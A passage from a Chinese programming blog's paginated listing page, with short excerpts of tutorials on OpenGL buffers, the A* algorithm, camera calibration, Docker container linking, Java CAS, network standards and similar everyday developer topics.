集成30mΩ低端开关可编程频率（130KHz?9?1300KHz）轻载时的突发模式操作
内部环路补偿内部软启动
采用SOP8封装
应用领域：车载充电器、可充电便携式设备、网络系统、分布式电源系统
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32b4effec3e49fb2d143ed813f6adb73/" rel="bookmark">
			VS 中使用QT 编译报“常量中有换行符”错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决办法：
在资源管理器中找到报错代码文件，用文本编辑器打开，然后另存选择编码选项为UTF-8，覆盖原有文件，重新编译即可！
在VS2022经测试有效。
转载：
VS 编译报“常量中有换行符”错误 - 氕氘钏 - 博客园
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3a4317ae4d36a5374069364c8fc7563/" rel="bookmark">
			OPenGL中的VBO、VAO、EBO作用理解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VBO是顶点缓冲对象(Vertex Buffer Objects, VBO)，包含了顶点的3d坐标和颜色。但它们是按同类数组存储的，存放在一片显存空间中，程序并不知道这些数字哪个代表3d坐标，哪个代表颜色。
VAO是顶点数组对象(Vertex Array Object, VAO)，用来表示这些数字的第几位分别代表顶点的什么属性。比如这些数字的第1-3位代表3d的xyz坐标，第4-7位代表rbg颜色和透明度。
EBO是元素缓冲对象(Element Buffer Object，EBO)，EBO是一个缓冲区，就像一个VBO一样，它存储 OpenGL 用来决定要绘制哪些顶点的索引,设置顶点的绘制顺序。EBO由VAO进行绑定，如下图所示：
如图所示：VAO1中下标为0的指针attribute pointer[0]对应VBO1中的pos[0],表示VOB1数组中下标为0位置代表坐标pos。
VAO2中下标为0的指针attribute pointer[0]对应VBO2中的pos[0]，VAO2中下标为1的指针attribute pointer[1]对应VBO2中的col[0]，表示VOB2数组中下标为1位置代表颜色col。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55d179fd6f0cb94c1a95860d24b4268e/" rel="bookmark">
			IDEA类和方法注释模板设置（非常详细）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述 IDEA自带的注释模板一般都很简单，然而我们在写代码的时候喜欢把类注释和文档注释写在代码里，既方便自己看所有的参数，也便于以后维护代码的时候看到编码作者。下面是我的代码注释，我们就按照这种格式来设置：
类注释模板：
方法注释模板：
二、类注释模板 1、File--&gt;settings--&gt;Editor--&gt;File and Code Templates--&gt;Files （1）@BelongsProject：当前项目的名称
（2）@BelongsPackage：当前包的名称
（3）@Author：作者姓名（可以写死，写成你的名字）
（4）@CreateTime：该类创建的时间
（5）@Description：对该类的描述（该类的功能）
（6）@Version：设置版本号，一般新创建的类都是1.0版本，这里写死就可以了
/** *@BelongsProject: ${PROJECT_NAME} *@BelongsPackage: ${PACKAGE_NAME} *@Author: yanhongwei *@CreateTime: ${YEAR}-${MONTH}-${DAY} ${HOUR}:${MINUTE} *@Description: TODO *@Version: 1.0 */ 三、方法注释模板 1、创建模板 IDEA还没有智能到自动为我们创建方法注释，这就是要我们手动为方法添加注释，我们的习惯是 /**+Enter，这里我们也按照这种习惯来设置IDEA的方法注释
1、File--&gt;Settings--&gt;Editor--&gt;Live Templates
（1）新建组：命名为userDefine
（2）新建模板：选中你刚才创建的组，然后右上角新建模板，命名为* 因为IDEA生成注释的默认方式是：/*+模板名+快捷键（比如若设置模板名为add快捷键用Tab，则生成方式为： /*add+Tab），如果不采用这样的生成方式IDEA中没有内容的方法将不可用，例如获取方法参数的methodParameters(）、获取方法返回值的methodReturnType(）
2、设置模板内容-IDEA格式模板 注意第一行，只有一个*而不是/*
在设置参数名时必须用${参数名}$的方式，否则第五步中读取不到你设置的参数名
注意：下面这段是代码，可以直接复制的！可以直接复制的！可以直接复制的！不要再问我为什么都是图片了，留着眼睛干啥？
* * @description: * @author: yanhongwei * @date: $date$ $time$ * @param: $param$ * @return: $return$ **/ 4、设置模板应用场景 点击模板页面最下方的警告，来设置将模板应用于那些场景，一般选择EveryWhere--&gt;Java即可
（如果曾经修改过，则显示为change而不是define）
5、设置参数 把右侧的Expand with：改为Enter ；然后选择右侧的Edit variables按钮
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55d179fd6f0cb94c1a95860d24b4268e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a427d12caae204beb7b0c8ec69095bac/" rel="bookmark">
			启发式搜索: A*算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		启发式搜索: A*算法 回顾: 优先队列BFS、最短路A*算法 – 估价函数为什么? A*算法实战 回顾: 优先队列BFS、最短路 普通BFS:按层扩展
优先队列BFS:每次从队列中取出当前代价最小的状态进行扩展
优先队列BFS的局限性:
一个状态的当前代价最小，只能说明从起始状态到该状态的代价很小,而在未来的搜索中，从该状态到目标状态可能会花费很大的代价。反之亦然。当前代价较大，也许未来代价较小，总代价反而更优。优先队列BFS缺少对未来的预估。
A*算法 – 估价函数 A*算法是一种启发式搜索（Heuristically Search）算法
A*算法的关键是设计一个估价函数:
以任意“状态”为输入，计算出从该状态到目标状态所需代价的估计值在搜索中，维护一个堆（优先队列)，优先选择“当前代价+未来估价”最小的状态进行扩展 估价函数的设计原则:估值必须比实际更优（估计代价≤未来实际代价)
只要保证上述原则，当目标状态第一次从堆中被取出时，就得到了最优解
为什么? 把好状态估差的后果:
本来在最优解搜索路径上的状态被错误地估计了较大的代价，被压在堆中无法取出，从而导致非最优解搜索路径上的状态不断扩展，直至在目标状态上产生错误的答案
把坏状态估好的后果:
只要估价不大于未来实际代价，这个值总会比最优解更早地被取出，从而得到修正。最坏后果无非就是算的状态多了,跑得慢一些。
否决一个正确idea vs 多看一个垃圾idea
A*算法 A*和优先队列BFS的区别就是:考虑优先级的时候有没有加上未来估价
估价越精准（接近但不超过未来实际代价)，A*算法越快
估价等于0，就退化为了优先队列BFS
A*算法的关键:开动脑筋，设计优秀的估价函数（必须要乐观估计，但也要尽量精准)
例如:求第K短路，把当前结点到终点的最短路作为估价函数（最短≤K短)
优先选择“当前走过的路径长度＋估价函数”最小的状态扩展
实战 773.滑动谜题
https://leetcode.cn/problems/sliding-puzzle/
class Solution { public: int slidingPuzzle(vector&lt;vector&lt;int&gt;&gt;&amp; board) { string start = zip(board); string target = zip({{1, 2, 3}, {4, 5, 0}}); //q.push(start); q.push({-evaluate(start), start}); depth[start] = 0; while (!q.empty()) { string s = q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a427d12caae204beb7b0c8ec69095bac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fff6e09d5756f7983e343f252d63b73b/" rel="bookmark">
			如何使用Java8对List进行排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 工作中，经常会对集合内的元素进行排序。利用Java8可以很方便的对List内的元素进行排序操作，下面介绍三种情况下的排序方法。
如何使用Java8对List进行排序_Java_大数据知识库 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/848274a1b7faba4ecc3c1b8420a1aee3/" rel="bookmark">
			React 异常捕获和处理机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大纲 React 开发和生产环境捕获异常的实现不同
如何捕获异常，同时不吞没用户业务代码的异常
如何模拟 try catch 捕获异常
React 捕获用户所有的业务代码中的异常，除了异步代码无法捕获以外。
React 使用 handleError 处理 render 阶段用户业务代码的异常，使用 captureCommitPhaseError 处理 commit 阶段用户业务代码的异常，而事件处理函数中的业务代码异常则简单并特殊处理
render 阶段抛出的业务代码异常，会导致 React 从 ErrorBoundary 组件或者 root 节点重新开始执行。而 commit 阶段抛出的业务代码异常，会导致 React 从 root 节点重新开始调度执行！
前置基础知识 如果还不熟悉 JS 异常捕获，比如全局异常捕获，Promise 异常捕获，异步代码异常捕获。自定义事件，以及 dispatchEvent 的用法。React 错误边界等基础知识的，可以参考以下几篇短文。如果已经熟悉了，可以跳过。
JS 异常捕获基础[2]
自定义事件以及 dispatchEvent 基础知识[3]
React 错误边界[4]
为什么 Dev 模式下， React 不直接使用 try catch，而是自己模拟 try catch 机制实现异常捕获？ 开发环境的目标：保持 Pause on exceptions 的预期行为 要回答这个问题，我们先看下 React 源码中一段关于异常捕获机制的描述：
同时结合这个issue[5]可以知道，React 异常处理最重要的目标之一就是保持浏览器的Pause on exceptions行为。如果对Pause on exceptions不熟悉的，可以看这篇文章[6]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/848274a1b7faba4ecc3c1b8420a1aee3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5056b2b0a66c3c1d8df5cb99f336f99a/" rel="bookmark">
			（附代码）入门 | 如何使用 Python 调用 C/C&#43;&#43; 代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编者荐语 前一篇文章我们介绍了如何使用C/C++调用Python脚本，本篇文章我们补齐另一个开发中很常见的问题。在我们使用 Python 进行开发的时候，由于一些算法是计算密集型的，就会导致过多的运行时间，这时我们就可以将这些算法使用 C/C++ 语言来实现，从而减少程序的运行时间。
使用Python很方便，但是在效率上比不上 C/C++ ；再者，某些时候我们想把一些关键性代码保护起来，我们便可以将这些代码编译成 C/C++ 的动态库，然后使用 Python 去调用，能够很好的实现这个目的。
一般有两种常用的实现方法：
使用 Python 扩展编写 C/C++ 代码，然后使用 import 调用动态库
使用 Python 的 ctypes 模块直接加载 C/C++ 动态库（使用常见的 C/C++ 代码编写方式）。
虽然都是编译为动态库，但较大差距在 C/C++ 代码的编写上。
不同实现方法的区别 第一种方法是 Python 为整合其它语言而存在的一种扩展机制，不限于 C/C++ 语言，小编个人感觉第二种方式比较便于理解与实现（通常情况下不需要对已有 C/C++ 代码进行改写，或只需进行少量改写），所以今天就用这种方式给大家介绍一下具体的实现过程。
针对第一种方式的实现，大家可以参考：https://docs.python.org/zh-cn/3/c-api/intro.html
到了这里，可能会有很多同学说 Cython ，是的， Cython 是会解决 Python / ctypes 的一系列问题（例如速度瓶颈），但是过多的学习成本可能不是你开始做一些简单事情时就可以接受的，而 ctypes 更擅长做简单的事情并快速运行，尤其是对 有 C/C++ 和 Python 经验的程序员来说。针对 Cython 与 ctypes 的选择，大家可以参考一下这里：https://www.codenong.com/1942298/
简单介绍一下库 库的本质就是一个打包好的代码包，通常可以分为静态库（.lib .a）和动态库（.dll .so），前者一般为 windows 环境下的后缀，后者为 linux 环境下的后缀。静态库在主程序编译时，会被一并编译到最终的可执行文件中，而动态库则是会在调用时再去查找相关的内容。因为 ctypes 并没有办法调用静态库，所以我们本次会将 C/C++ 编译为动态库。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5056b2b0a66c3c1d8df5cb99f336f99a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdecb47e1ae6fe3ee37ca118c57b9525/" rel="bookmark">
			EPON与GPON的主要区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、简介 随着技术的创新与应用，在光通信领域，越来越多的设备制造商和运营商从传统的ADSL技术转向了光网络技术，在光网络技术中，我们谈到最多的就是EPON技术和GPON技术，今天我们从几个方面来说下他们之间的区别。
二、标准 EPON(Ethernet Passive Optical Network，以太网无源光网络)，是基于以太网的PON技术。它采用点到多点结构、无源光纤传输，在以太网之上提供多种业务。EPON技术由IEEE802.3 EFM工作组进行标准化。2004年6月，IEEE802.3EFM工作组发布了EPON标准--IEEE802.3ah (2005年并入IEEE802.3-2005标准)。在该标准中将以太网和PON技术结合，在物理层采用PON技术，在数据链路层使用以太网协议，利用PON的拓扑结构实现以太网接入。
GPON技术起源于1995年开始逐渐形成的ATM PON技术标准，而GPON(Gigabit-Capable Passive Optical Network) 最早由FSAN组织于2002年9月提出，ITU-T在此基础上于2003年3月完成了ITU-T G.984.1 和G.984.2的制定，2004年2月和6月完成了G.984.3的标准化。从而最终形成了GPON的标准族。 三、速率 EPON提供固定上下行1.25Gbps，采用8b/10b线路编码，实际速率为1Gbps。
GPON支持多种速率等级，采用NRZ编码，可以支持上下行不对称速率，下行2.448Gbps或1.244Gbps，上行1.224Gbps或622Mbps，一般采用下行2.448Gbps,上行1.244Gbps。
四、分路比 EPON标准定义分路比1：32；1:64
GPON标准定义分路比下列几种1：32；1：64；1：128
五、GPON与EPON协议栈比较 EPON采用简单的以太网数据格式，通过MPCP点到多点控制协议来实现EPON系统中的带宽分配、注册、测距等功能；
GPON采用全新的传输融合（TC）层，定义了ATM封装和GFP封装，能够实现业务多样性，功能更加强大。
六、QOS（Quality of Service） EPON在MAC层Ethernet报头增加了64字节的MPCP多点控制协议（multipoint control protocol），MPCP通过消息、状态机和定时器来控制访问P2MP点到多点的拓扑结构，实现DBA动态带宽分配。MPCP涉及的内容包括ONU发送时隙的分配、ONU的自动发现和加入、向高层报告拥塞情况以便动态分配带宽。MPCP提供了对P2MP拓扑架构的基本支持，但是协议中并没有对业务的优先级进行分类处理，所有的业务随机的竞争着带宽，GPON则拥有更加完善的DBA，具有优秀QoS服务能力。
GPON将业务带宽分配方式分成4种类型，优先级从高到低分别是固定带宽（Fixed）、保证带宽（Assured）、非保证带宽（Non-Assured）和尽力而为带宽（Best Effort）。DBA又定义了业务容器（traffic container，T-CONT）作为上行流量调度单位，每个T-CONT由Alloc-ID标识。每个T-CONT可包含一个或多个GEMPort-ID.T-CONT分为5种业务类型，不同类型的T-CONT具有不同的带宽分配方式，可以满足不同业务流对时延、抖动、丢包率等不同的QoS要求。
T-CONT类型1的特点是固定带宽固定时隙，对应固定带宽（Fixed）分配，适合对时延敏感的业务，如话音业务；
T-CONT类型2的特点是固定带宽但时隙不确定，对应保证带宽（Assured）分配，适合对抖动要求不高的固定带宽业务，如视频点播业务；
T-CONT类型3的特点是有最小带宽保证又能够动态共享富余带宽，并有最大带宽的约束，对应非保证带宽（Non-Assured）分配，适合于有服务保证要求而又突发流量较大的业务，如下载业务；
T-CONT类型4的特点是尽力而为（Best Effort），无带宽保证，适合于时延和抖动要求不高的业务，如WEB浏览业务； T-CONT类型5是组合类型，在分配完保证和非保证带宽后，额外的带宽需求尽力而为进行分配。
EPON和GPON各有千秋，从性能指标上GPON要优于EPON，且就目前市场上来看，GPON的应用已远超过EPON的市场容量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cbd24b80e68f03ebc3afe64b6287a0e/" rel="bookmark">
			相机标定-机器视觉基础（理论推导、Halcon和OpenCV相机标定）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相机标定是获得目标工件精准坐标信息的基础。首先，必须进行相机内参标定，构建一个模型消除图像畸变；其次，需要对相机和机器人的映射关系进行手眼标定，构建一个模型将图像坐标系上的点映射到世界坐标系。主要分为背景知识、相机内外参模型推导、编程代码实现三个部分。
1 背景知识 在讨论相机模型标定之前，我们应当先了解几何里面关于2D、3D空间里面几种几何变换形式。主要包括欧式变换、相似变换、仿射变换和透视变换，相机标定的过程，就是一个透视变换矩阵求解的过程。
参考来源：北京邮电大学鲁鹏老师的课件
1.1 2D平面上的变换 1.1.1 欧式变换 所谓欧式变换，即只有平移加旋转的变换，例如在2D平面上有一个正方形，经过变换后正方形的尺寸没有发生改变，但中心点会发生改变，并且偏转了一定的角度。自由度为三个，即xy方向的平移和旋转的角度theta。
1.1.2 相似变换 所谓的相似变换，即在欧式变换的基础上，附加一个均匀伸缩变换。经过变换后，在相似变换的基础上对原有的尺寸进行了放缩。但保证线与线之间的角度、长度的比值和面积的比值不变。自由度为四个：即xy方向的平移和旋转的角度再加一个放缩系数。
1.1.3 仿射变换 所谓的仿射变换，即在相似变换的基础上再增加了两个自由度。由上图的相似变换矩阵可以得知，决定矩阵数值的值主要有s、θ、X0、Y0。我们可以看到s、θ两个参数决定了矩阵里面的四个数值，假设这四个参数完全由a、b、c、d四个独立的变量进行控制，即仿射变换一共有六个自由度。变换前后线与线之间的平行性、平行线段长度的比值和面积的比值不变。
1.1.3 透视变换 所谓的透视变换，即在仿射变换的基础上再次增加两个自由度，由仿射变换的矩阵我们可以看到，其第三行两个数值都为0，假设其不为0，分别为V1、V2。因此，透视变换一共有八个自由度，变换前后只有四共线的交比保持不变，即交比不变性。
1.2 3D空间上的变换 1.2.1 欧式变换 所谓欧式变换，即只有平移加旋转的变换。当其在三维空间里面时，旋转共有绕三个轴xyz的旋转，平移也是发生在三维空间。同时在此基础上附加一个放缩系数s，其一共有七个自由度，变换前后不变量：点变换到点、线变换到线；保持点的共线性、线的共面性；保持直线与直线、直线与平面、平面与平面的平行性不变；保持线的夹角不变。
三维空间旋转平移变换可参考：机器人学导论
1.2.2 仿射变换 三维空间的仿射变换，在上面欧式变换的基础上进一步增加自由度。由欧式变换的上图可知，其中R旋转矩阵由绕三个XYZ轴旋转的角度决定的。R矩阵是一个3×3的矩阵，当里面九个参数互相独立时，就是三维空间的仿射变换。其一共有12个自由度，变换前后的不变量：保持无穷远平面不变（无穷远点变换到无穷远点），保持直线与直线、直线与平面、平面与平面的平行性不变。
1.2.3 透视变换 三维空间的透视变换，可以看到上面仿射变换矩阵主要由矩阵A、向量t、向量0和1组成。因为A为一个3×3的矩阵，所以向量0是一个三维向量。如果这个向量不为0，为三个独立的数值构成的向量。则透视变换矩阵在仿射变换矩阵的基础上再次增加了三个自由度，其一共有十五个自由度，变换前后的不变量有：点变换到点、线变换到线，保持点的共线性和线的共面性。
综上所述，经过透视变换后，线的平行性不再保持，这也引申出影消点和影消线的概念，即在实际空间中，互相平行的铁轨，变换到图像里，会相交于一点。由这些点组成的线就是影消线。
基于影消线和影消点，可以实现三维重建，这里不再赘述。
鲁鹏老师三维重建课程之单视图重建https://blog.csdn.net/beyond951/article/details/122265206?spm=1001.2014.3001.5501
2 相机内外参模型推导 2.1 相机外参 在三维空间中，准确描述执行器的状态，需要包括执行器的位置信息和姿态信息。齐次变换矩阵在机器人学中描述一个坐标系到另一个坐标系变换关系的矩阵，包括位姿的旋转分量和平移分量。
相机小孔成像模型
如图上图所示，显示了针孔相机成像的透视投影模型。世界点P通过透镜的光学中心投射到像面上的点P'，点位于光学中心后面距离(焦距)f处。基于该投影模型，可以描述物体在世界坐标系中的点映射到图像平面和相应的相机参数。
世界坐标系变换到相机坐标系
如图上图所示，先确定点 P是在世界坐标系WCS中，为确定世界坐标系映射到图像坐标系的关系，需要先转换成相机坐标系CCS。定义CCS，使其x轴和y轴分别平行于图像的c轴和r轴，z轴垂直于图像平面。其可以用位姿进行描述，也可以用齐次变换矩阵cwH表示。因此，相机坐标系点Pc(Xc,Yc,Zc)可由世界坐标系Pw(Xw,Yw,Zw)变换得到：
2.2 相机内参 假设成像面位于光心前面距离为f的位置，如下图所示。
接下来，将相机坐标系CCS的点(Xc,Yc,Zc)投影到图像坐标系。对于针孔相机模型，投影为透视投影，由此可得：
对于远心相机模型，透视为平行投影，此时，没有焦距，f近似于无穷远，由此可得：
（1）畸变矫正
相机在加工过程中，由于各类非线性因素的影响，会存在一定的误差，从而造成镜头畸变。导致视觉系统获取的图像与实际图像之间产生差别。不同相机产生的畸变情况也会有差异，在制造装配过程中产生的误差，造成图像径向畸变比较严重。
坐标点投影到成像面后，畸变会造成成像面上的点qc(u,v)偏移至qc'(u',v')。其效果图如下图所示，如果没有畸变存在的情况下，成像面上P‘应投影在点P和光学中心延长线与成像面的交点处。相机畸变的存在造成P在不同的位置。相机畸变是一种可以单独在图像平面上建模的变换，畸变可以用出发模型或多项式模型来建模。
除法模型使用一个参数k来模拟径向变形。基于除法模型，通过下面的方程表示相机的畸变模型。
这些方程可以通过解析的方法进行反求，如果采用除法模型，则会得到下列方程，将未有畸变的坐标转化为畸变的坐标，其解析解如下：
参数k用来模拟径向变形的大小。如果k为负，则扭曲为桶形，而k为正，则扭曲为枕形。其变形如图所示。
多项式模型使用三个参数（K1,K2,K3）来模拟径向畸变，两个参数（P1,P2）来模拟扭转变形。下面的多项式模型可以将失真的像平面坐标转换为未失真的像平面坐标。
该模型不能用解析法进行反求。因此，失真图像平面坐标必须从未失真图像平面坐标数值计算出来。综上考虑，本文采用多项式模型对相机获取的图像进行矫正，最终可以得到5个畸变参数K1,K2,K3,P1,P2。
编程代码实现 基于Halcon标定 基于halcon标定主要是采集完图像后运用halcon的标定助手对相机内外参进行标定。采集到的图像如下图所示：
标定后的内外参为：
标定后的外参为：
基于OpenCV标定 用于标定的图像：
标定的程序代码：
void Cam_Calib() { Creat_CalibImg_Path(); vector&lt;string&gt; Img_Vec; char dir[64]; char fileNames[64]; ofstream fout(calibrationResult); //保存标定结果的文件 // 利用dir命令将当前目录下的.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cbd24b80e68f03ebc3afe64b6287a0e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5eae4b1a73cd10153569661ed403d522/" rel="bookmark">
			爬虫向：header的作用与意义以及怎么找
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实践部分：
目录
header的寻找方法
首先
明确一个概念
header在爬虫中意味着什么？
在解释清这个问题之前，其实还有一个问题需要解释
使用爬虫翻动网页获取信息，同真人亲自翻动网页获取信息究竟有什么不同：
首先，我们正常访问一个网页的流程：
鼠标双击触发网址————载入网页————人眼浏览网页信息
这是一个完整的浏览过程。
但是当我们试图通过爬虫获得想要获取网页信息时，流程就会变为： 找到网址——request请求并获取网页信息——清洗整理信息——储存至指定位置以备人眼浏览
所以在当我们需要集合整理多网页的不同信息时，我本人更倾向于...写个爬虫让他自己吭哧吭哧爬，爬完了我随便一浏览就行。
但是...有些网址不想让你这么省事...随便爬爬就能让你获取信息会给运行网页的服务器造成很大压力...所以爬虫这事，虽然不违法，但通常来说，并不受欢迎...网站通常会设置一些“关卡”来阻碍你的爬虫。
所以为了方便获得网站信息，我们写爬虫的时候要尽量把自己的爬虫伪装的像一个正在浏览信息的人，来绕过这些“关卡”。
说回第一个问题“ header在爬虫中意味着什么？”
我们访问一个网页的时候，点击进去就是一个完整的浏览过程。当我们想要获取网页数据的时候，就要跟这种浏览过程一样，不然网页会把我们阻拦在外面。header就是帮助我们完成这样浏览过程的一个工具。给爬虫加一个header请求头，是常规的反爬的方法之一，相当于我们进去这个网页的服务器本身，假装自己本身在浏览网站信息。目前80%的网站都需要构建请求头来爬取。
header的寻找方法 首先，打开目标网页然后按“F12”（无论用什么浏览器都可以通过按F12解决）
然后按图示操作就行了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32f7bcb3d970c8c3f6b49d078fc5a2d5/" rel="bookmark">
			Docker容器互联
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Docker容器互联 创建数据库（mariadb）容器创建discuz容器连接数据库安装Discuz站点（向导）查看discuz容器的环境变量 创建数据库（mariadb）容器 [root@johnnyg03 ~]# docker run -d --name db --env MYSQL_ROOT_PASSWORD=123456 mariadb:latest a7343e7ed245e3533137ab486c4db2f79838b393445a167b5858c2f3366c02d3 #“--env MYSQL_ROOT_PASSWORD=123456”表示创建环境变量为数据库设置root密码 [root@johnnyg03 ~]# docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES a7343e7ed245 mariadb:latest "docker-entrypoint.s…" 3 minutes ago Up 3 minutes 3306/tcp db #进入数据库容器查看数据库是否创建成功并且root密码是否设置成功（环境变量设置） [root@johnnyg03 ~]# docker exec -it db /bin/bash root@a7343e7ed245:/# mysql -uroot -p123456 Welcome to the MariaDB monitor. Commands end with ; or \g. Your MariaDB connection id is 3 Server version: 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32f7bcb3d970c8c3f6b49d078fc5a2d5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f78ec1f1b1c626d02b85f6970837ee6/" rel="bookmark">
			JUC并发编程 共享模式之无锁 -- CAS（工作方式 &amp; 与volatile的关联 &amp; 效率分析 &amp; 特点(乐观锁/悲观锁)）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 工作方式 前面看到的 AtomicInteger 的解决方法，内部并没有用锁来保护共享变量的线程安全。那么它是如何实现的呢？
@Override public void withdraw(Integer amount) { while (true) { // 获取余额的最新值 int prev = balance.get(); // 要修改的余额 int next = prev - amount; // 真正修改 返沪一个布尔值 修改成功才会退出循环 if (balance.compareAndSet(prev, next)) { break; } } } 实现原理:
其中的关键是 compareAndSet，它的简称就是 CAS （也有 Compare And Swap 的说法），它必须是原子操作。
注意:
其实 CAS 的底层是 lock cmpxchg 指令（X86 架构），在单核 CPU 和多核 CPU 下都能够保证【比较-交换】的原子性。在多核状态下，某个核执行到带 lock 的指令时，CPU 会让总线锁住，当这个核把此指令执行完毕，再开启总线。这个过程中不会被线程的调度机制所打断，保证了多个线程对内存操作的准确性，是原子的。 2. 与volatile的关联 为什么需要用volatile修饰呢?
获取共享变量时，为了保证该变量的可见性，需要使用 volatile 修饰。它可以用来修饰成员变量和静态成员变量，他可以避免线程从自己的工作缓存中查找变量的值，必须到主存中获取它的值，线程操作 volatile 变量都是直接操作主存。即一个线程对 volatile 变量的修改，对另一个线程可见。 注意:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f78ec1f1b1c626d02b85f6970837ee6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33b2c1d52126a02789d666aae3187258/" rel="bookmark">
			Javaee SSM&#43;JSP 水果订单管理系统大作业
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. JvaaEE SSM+JSP 水果订单管理系统大作业1.1 介绍1.2 设计说明1.3 系统主要表设计:1.4 功能展示1.4.1 注册功能：1.4.2 登录功能：1.4.3 零售商管理功能展示：1.4.4 用户设置功能展示：1.4.5 货物管理功能展示：1.4.6 购销合同功能展示： 1.5 补充：数据库文件 1. JvaaEE SSM+JSP 水果订单管理系统大作业 1.1 介绍 资源位置：
javaee-final-homework.zip 百度网盘资源链接：因为上面的资源还在审核，所以我在网盘上存了一份分享出来。
链接：https://pan.baidu.com/s/1ikyrt0ybmOuTT5mTj-V0fg
提取码：3210
说明：
运行sql后，配置Tomcat即可运行。
介绍：
半期作业，匆忙赶制的，细节处可能不够完善，但SSM和Java Web技术是没有问题的。纯JSP+SSM开发，弹窗，JS等等都是手动加上去的。
1.2 设计说明 果农与零售商贸易关系图:
果农与零售商经济关系图:
系统用例图：
系统功能结构图:
系统数据关系图:
1.3 系统主要表设计: 用户信息表 user:
首先是用户表 该系统会为用户提供登录注册功能，所以用户表中需要存储 基本信息和账号密码。这里的 userid 字段的数据类型为 varchar ，因为系统选择 UUID 主键生成策略，而不是自增主键，这样便于以后数据的迁移和合并。 水果商品信息表 commodities:
由于该系统服务于果农，所以商品类型自然是水果，那么表结构的设计应遵循水果的基本属性。
水果商品表中除了有水果的名称、价格及产地外，还包括水果信息录入系统的时间，这样便于管理者浏览和检查商品录入的情况
附属品信息表:accessory
可以看到，除了附属品主键外，还有附属品所属的商品 ID 外键 其余是附属品的基本信息和创建时间 。后面会通过中间表将 属品与商品 采购合同关联起来。
零售商信息表 retailer:
该表中除了零售商的基本信息以外，还有 个状态宇段，当用户不再和某个零售商合作时可以将其设置为停用（数字 0）状态，这样用户在创建采购合同时就不会看到该零售商。如果用户想恢复与该零售商的合作，将状态改为启用（数字 1）即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/33b2c1d52126a02789d666aae3187258/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/213/">«</a>
	<span class="pagination__item pagination__item--current">214/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/215/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>